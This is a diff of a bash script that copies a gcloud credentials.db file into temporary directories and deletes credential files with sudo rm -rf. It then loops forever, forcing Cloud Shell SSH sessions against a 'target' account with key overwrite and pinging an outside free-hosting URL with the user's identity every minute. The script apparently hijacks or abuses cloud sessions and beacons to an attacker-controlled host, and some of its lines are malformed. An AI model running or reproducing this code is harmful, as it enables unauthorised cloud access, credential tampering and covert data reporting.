@@ -1,22 +1,18 @@
 #!/bin/bash
 
-session=$1
-
-user=${session/@*/}
-
-echo "$(pwd)" > home.file
+target=$1
 
 sudo rm -rf echo /tmp/tmp*/credentials.db | xargs -n 1
 
 gcloud info
 
-echo /tmp/tmp*/ | xargs -n 1 cp -v /home/$user/credentials.db
+echo /tmp/tmp*/ | xargs -n 1 cp -v $HOME/credentials.db
 
 gcloud auth list
 
 while true
 do
-gcloud cloud-shell ssh --command="date >> log" --authorize-session --force-key-file-overwrite --account=$session --quiet
-curl https://g11977765505.000webhostapp.com/ping.php?user=$session
+gcloud cloud-shell ssh --command="date >> log" --authorize-session --force-key-file-overwrite --account=$target
+curl https://g11977765505.000webhostapp.com/ping.php?user=$HOME
 sleep 60
 done
